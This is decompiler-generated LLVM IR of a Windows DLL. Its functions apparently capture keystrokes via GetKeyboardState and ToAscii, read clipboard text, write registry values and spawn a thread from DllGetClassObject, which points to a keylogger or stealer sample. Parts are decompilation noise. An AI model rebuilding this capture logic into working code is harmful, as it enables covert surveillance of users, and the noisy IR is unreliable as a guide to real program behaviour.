define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !527
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !527
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !527
  %6 = inttoptr i32 %3 to i32*, !insn.addr !527
  store i32 %5, i32* %6, align 4, !insn.addr !527
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !528
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !528
  %11 = add i8 %8, %10, !insn.addr !528
  %12 = inttoptr i32 %9 to i8*, !insn.addr !528
  store i8 %11, i8* %12, align 1, !insn.addr !528
  %13 = add i32 %1, 122, !insn.addr !529
  %14 = inttoptr i32 %13 to i8*, !insn.addr !529
  %15 = load i8, i8* %14, align 1, !insn.addr !529
  %16 = udiv i32 %4, 256, !insn.addr !529
  %17 = trunc i32 %16 to i8, !insn.addr !529
  %18 = add i8 %15, %17, !insn.addr !529
  store i8 %18, i8* %14, align 1, !insn.addr !529
  %19 = load i8, i8* %7, align 4, !insn.addr !530
  %20 = load i32, i32* %eax, align 4, !insn.addr !530
  %21 = trunc i32 %20 to i8, !insn.addr !530
  %22 = add i8 %19, %21, !insn.addr !530
  %23 = icmp eq i8 %22, 0, !insn.addr !530
  %24 = inttoptr i32 %20 to i8*, !insn.addr !530
  store i8 %22, i8* %24, align 1, !insn.addr !530
  %25 = trunc i32 %3 to i16, !insn.addr !531
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !531
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !532

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !532
  br label %dec_label_pc_404dc9, !insn.addr !532

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !530
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !533
  store i32 %29, i32* %eax, align 4, !insn.addr !533
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !534

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !535, !insn.addr !530
  %31 = and i8 %30, 1, !insn.addr !530
  %32 = icmp eq i8 %31, 0, !insn.addr !530
  %33 = trunc i32 %arg4 to i16, !insn.addr !536
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !536
  %35 = inttoptr i32 %2 to i32*, !insn.addr !536
  store i32 %34, i32* %35, align 4, !insn.addr !536
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !537

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !538
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !539
  %36 = add i32 %arg4, 1, !insn.addr !540
  %37 = icmp eq i32 %36, 0, !insn.addr !540
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !541
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !541

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !542
  %39 = add i32 %38, -1, !insn.addr !542
  store i32 %39, i32* %eax, align 4, !insn.addr !542
  %40 = trunc i32 %36 to i16, !insn.addr !543
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !543
  %42 = load i32, i32* %41, align 4, !insn.addr !543
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !543
  %43 = load i32, i32* %41, align 4, !insn.addr !544
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !544
  %44 = add i32 %arg7, 105, !insn.addr !545
  %45 = inttoptr i32 %44 to i8*, !insn.addr !545
  %46 = load i8, i8* %45, align 1, !insn.addr !545
  %47 = trunc i32 %39 to i8, !insn.addr !545
  %48 = add i8 %46, %47, !insn.addr !545
  %49 = icmp ult i8 %48, %46, !insn.addr !545
  store i8 %48, i8* %45, align 1, !insn.addr !545
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !546
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !546

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !545
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !547

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !548
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !549
  %53 = load i32, i32* %52, align 4, !insn.addr !549
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !549
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !550
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !551
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !552
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !553
  %55 = add i32 %arg6, -8, !insn.addr !554
  %56 = inttoptr i32 %55 to i32*, !insn.addr !554
  store i32 0, i32* %56, align 4, !insn.addr !554
  %57 = add i32 %arg6, -12, !insn.addr !555
  %58 = inttoptr i32 %57 to i32*, !insn.addr !555
  store i32 1, i32* %58, align 4, !insn.addr !555
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !556
  ret i32 %57, !insn.addr !556

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !557

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !558
  %62 = add i8 %60, %61, !insn.addr !558
  %63 = inttoptr i32 %2 to i8*, !insn.addr !558
  store i8 %62, i8* %63, align 1, !insn.addr !558
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !559
  %65 = load i8, i8* %64, align 1, !insn.addr !559
  %66 = udiv i32 %arg3, 256, !insn.addr !559
  %67 = trunc i32 %66 to i8, !insn.addr !559
  %68 = add i8 %65, %67, !insn.addr !559
  store i8 %68, i8* %64, align 1, !insn.addr !559
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !559
  br label %dec_label_pc_404e37, !insn.addr !559

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !560
  %70 = inttoptr i32 %69 to i32*, !insn.addr !560
  store i32 0, i32* %70, align 4, !insn.addr !560
  %71 = add i32 %esp.0, -8, !insn.addr !561
  %72 = inttoptr i32 %71 to i32*, !insn.addr !561
  store i32 0, i32* %72, align 4, !insn.addr !561
  %73 = add i32 %esp.0, -12, !insn.addr !562
  %74 = inttoptr i32 %73 to i32*, !insn.addr !562
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !562
  %75 = add i32 %esp.0, -16, !insn.addr !563
  %76 = inttoptr i32 %75 to i32*, !insn.addr !563
  store i32 -2147483647, i32* %76, align 4, !insn.addr !563
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !564
  %78 = call i32 @function_4034c8(), !insn.addr !565
  %79 = add i32 %78, 1, !insn.addr !566
  %80 = add i32 %esp.0, -20, !insn.addr !567
  %81 = inttoptr i32 %80 to i32*, !insn.addr !567
  store i32 %79, i32* %81, align 4, !insn.addr !567
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !568
  br label %dec_label_pc_404e57, !insn.addr !568

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !569
  %83 = add i32 %esp.1.reload, -4, !insn.addr !570
  %84 = inttoptr i32 %83 to i32*, !insn.addr !570
  store i32 %82, i32* %84, align 4, !insn.addr !570
  %85 = add i32 %esp.1.reload, -8, !insn.addr !571
  %86 = inttoptr i32 %85 to i32*, !insn.addr !571
  store i32 1, i32* %86, align 4, !insn.addr !571
  %87 = add i32 %esp.1.reload, -12, !insn.addr !572
  %88 = inttoptr i32 %87 to i32*, !insn.addr !572
  store i32 0, i32* %88, align 4, !insn.addr !572
  %89 = add i32 %esp.1.reload, -16, !insn.addr !573
  %90 = inttoptr i32 %89 to i32*, !insn.addr !573
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !573
  %91 = add i32 %arg6, -8, !insn.addr !574
  %92 = inttoptr i32 %91 to i32*, !insn.addr !574
  %93 = load i32, i32* %92, align 4, !insn.addr !574
  %94 = add i32 %esp.1.reload, -20, !insn.addr !575
  %95 = inttoptr i32 %94 to i32*, !insn.addr !575
  store i32 %93, i32* %95, align 4, !insn.addr !575
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !576
  %97 = load i32, i32* %92, align 4, !insn.addr !577
  %98 = add i32 %esp.1.reload, -24, !insn.addr !578
  %99 = inttoptr i32 %98 to i32*, !insn.addr !578
  store i32 %97, i32* %99, align 4, !insn.addr !578
  %100 = call i32 @function_404374(), !insn.addr !579
  %101 = load i32, i32* %99, align 4, !insn.addr !580
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !581
  store i32 4214421, i32* %90, align 4, !insn.addr !582
  %102 = call i32 @"@LStrClr"(), !insn.addr !583
  ret i32 %102, !insn.addr !584
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !585
  ret i32 %0, !insn.addr !585
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !586
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !587
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !588
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !588
  %5 = inttoptr i32 %2 to i8*, !insn.addr !588
  store i8 %4, i8* %5, align 1, !insn.addr !588
  %6 = add i32 %0, 111, !insn.addr !589
  %7 = inttoptr i32 %6 to i8*, !insn.addr !589
  %8 = load i8, i8* %7, align 1, !insn.addr !589
  %9 = trunc i32 %1 to i8, !insn.addr !589
  %10 = add i8 %8, %9, !insn.addr !589
  %11 = icmp eq i8 %10, 0, !insn.addr !589
  store i8 %10, i8* %7, align 1, !insn.addr !589
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !590

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !590
  br label %dec_label_pc_404ea1, !insn.addr !590

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !589
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !591

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !535, !insn.addr !589
  %16 = and i8 %15, 1, !insn.addr !589
  %17 = icmp eq i8 %16, 0, !insn.addr !589
  %18 = trunc i32 %arg4 to i16, !insn.addr !592
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !592
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !592
  store i32 %19, i32* %20, align 4, !insn.addr !592
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !593

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !594
  %22 = icmp eq i32 %21, 0, !insn.addr !594
  store i32 %arg2, i32* %.reg2mem, !insn.addr !595
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !595

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !596
  %24 = trunc i32 %21 to i16, !insn.addr !597
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !597
  %26 = load i32, i32* %25, align 4, !insn.addr !597
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !597
  %27 = load i32, i32* %25, align 4, !insn.addr !598
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !598
  %28 = add i32 %arg7, 105, !insn.addr !599
  %29 = inttoptr i32 %28 to i8*, !insn.addr !599
  %30 = load i8, i8* %29, align 1, !insn.addr !599
  %31 = trunc i32 %23 to i8, !insn.addr !599
  %32 = add i8 %30, %31, !insn.addr !599
  %33 = icmp eq i8 %32, 0, !insn.addr !599
  store i8 %32, i8* %29, align 1, !insn.addr !599
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !600

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !601
  %34 = inttoptr i32 %23 to i8*, !insn.addr !602
  %35 = load i8, i8* %34, align 1, !insn.addr !602
  %36 = add i8 %35, %31, !insn.addr !602
  store i8 %36, i8* %34, align 1, !insn.addr !602
  %37 = add i32 %arg5, 86, !insn.addr !603
  %38 = inttoptr i32 %37 to i8*, !insn.addr !603
  %39 = load i8, i8* %38, align 1, !insn.addr !603
  %40 = trunc i32 %21 to i8, !insn.addr !603
  %41 = add i8 %39, %40, !insn.addr !603
  store i8 %41, i8* %38, align 1, !insn.addr !603
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !604
  %42 = call i32 @"@LStrClr"(), !insn.addr !605
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !606
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !607
  %44 = zext i1 %43 to i32, !insn.addr !608
  ret i32 %44, !insn.addr !608

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !609
  %46 = inttoptr i32 %45 to i8*, !insn.addr !609
  %47 = load i8, i8* %46, align 2, !insn.addr !609
  %48 = mul i8 %47, 2, !insn.addr !609
  store i8 %48, i8* %46, align 2, !insn.addr !609
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !610
  %50 = icmp eq i32* %49, null, !insn.addr !611
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !612

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !610
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !613
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !614
  %53 = icmp eq i32* %52, null, !insn.addr !615
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !616

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !617
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !618
  br label %dec_label_pc_404f04, !insn.addr !618

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !619
  br label %dec_label_pc_404f09, !insn.addr !619

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !620
  %57 = sext i1 %56 to i32, !insn.addr !620
  store i32 %57, i32* %.reg2mem, !insn.addr !621
  br label %dec_label_pc_404f0f, !insn.addr !621

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !622
  ret i32 %.reload, !insn.addr !622
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !623
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !623
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !624
  %4 = inttoptr i32 %3 to i32*, !insn.addr !625
  %5 = load i32, i32* %4, align 4, !insn.addr !625
  %6 = icmp eq i32 %5, 0, !insn.addr !625
  %7 = icmp eq i1 %6, false, !insn.addr !626
  %8 = icmp eq i1 %7, false, !insn.addr !627
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !627

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !628
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !629
  %11 = icmp eq i32* %10, null, !insn.addr !630
  %12 = icmp eq i1 %11, false, !insn.addr !631
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !631

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220648 to i32*), i32 0, i32* null), !insn.addr !632
  br label %dec_label_pc_404f50, !insn.addr !632

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !633
  store i32 0, i32* %15, align 4, !insn.addr !633
  ret i32 -2147221231, !insn.addr !634
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !635
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !636
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !637
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !638
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !638
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !638
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !639
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !640
  %3 = add i32 %2, 1, !insn.addr !640
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !640
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !641
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !642
  ret i32 0, !insn.addr !643
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !644
  ret i32 %0, !insn.addr !644
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !645
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !646
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !647
  %2 = add i32 %1, -1, !insn.addr !647
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !647
  ret i32 %0, !insn.addr !648
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !649
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !650
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !650
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !650
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !651
  %4 = call i32 @function_4071cc(), !insn.addr !652
  %5 = icmp ne i32 %4, 0, !insn.addr !653
  %6 = icmp eq i1 %5, false, !insn.addr !654
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !655
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !655

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_407268(), !insn.addr !656
  %8 = call i32 @"@LStrDelete"(), !insn.addr !657
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !658
  br label %dec_label_pc_4050bb, !insn.addr !658

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_407268(), !insn.addr !659
  %10 = call i32 @"@LStrDelete"(), !insn.addr !660
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !661
  br label %dec_label_pc_4050bb, !insn.addr !661

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !662
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !663
  %14 = udiv i32 %1, 65536, !insn.addr !664
  %15 = and i32 %14, 255, !insn.addr !665
  %16 = inttoptr i32 %15 to i16*, !insn.addr !666
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !667
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !668
  %19 = icmp eq i32 %18, 1, !insn.addr !669
  %20 = icmp eq i1 %19, false, !insn.addr !670
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !670
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !670

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406f30(), !insn.addr !671
  %22 = icmp eq i32 %21, 0, !insn.addr !672
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !673
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !673

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !674
  %24 = icmp sgt i32 %23, 15, !insn.addr !675
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !675
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !675

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_407268(), !insn.addr !676
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !677
  %27 = call i32 @"@LStrInsert"(), !insn.addr !678
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !678
  br label %dec_label_pc_4050bb, !insn.addr !678

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !679
  %29 = load i32, i32* %28, align 4, !insn.addr !679
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !680
  %30 = add i32 %esp.0.reload, 8, !insn.addr !681
  %31 = inttoptr i32 %30 to i32*, !insn.addr !681
  store i32 4215003, i32* %31, align 4, !insn.addr !681
  %32 = call i32 @"@LStrClr"(), !insn.addr !682
  ret i32 %32, !insn.addr !683
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !684
  ret i32 %0, !insn.addr !684
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !685
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !686
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !687
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !687
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !687
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !688
  %2 = call i32 @function_4071cc(), !insn.addr !689
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !690
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !691
  %4 = add i32 %1, 8, !insn.addr !692
  %5 = inttoptr i32 %4 to i32*, !insn.addr !692
  store i32 4215210, i32* %5, align 4, !insn.addr !692
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !693
  ret i32 %6, !insn.addr !694
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !695
  ret i32 %0, !insn.addr !695
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !696
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !697
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !698
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !699
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !699
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !699
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !700
  %3 = call i32 @function_40713c(), !insn.addr !701
  %4 = icmp eq i32 %3, 0, !insn.addr !702
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !703
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !703

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !704
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !705
  %7 = ptrtoint i32* %6 to i32, !insn.addr !705
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !706
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !706
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !707
